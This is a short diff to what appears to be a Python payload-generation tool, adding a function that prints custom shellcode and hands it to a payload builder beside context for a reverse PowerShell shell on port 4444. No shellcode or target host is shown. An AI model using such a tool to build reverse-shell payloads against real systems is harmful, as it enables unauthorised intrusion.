@@ -84,6 +84,13 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     else:
         return "pass"
 
+
+def customShellcodeGeneration(payloadchoice,payloadname):
+    shellcode = payloadchoice()
+    print '\n' + shellcode
+    print t.bold_green + '[*] Custom Shellcode in use' + t.normal
+    GeneratePayload(shellcode,payloadname,shellcode)
+
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
     shellcode = payloadchoice % (ipaddr,portnum)
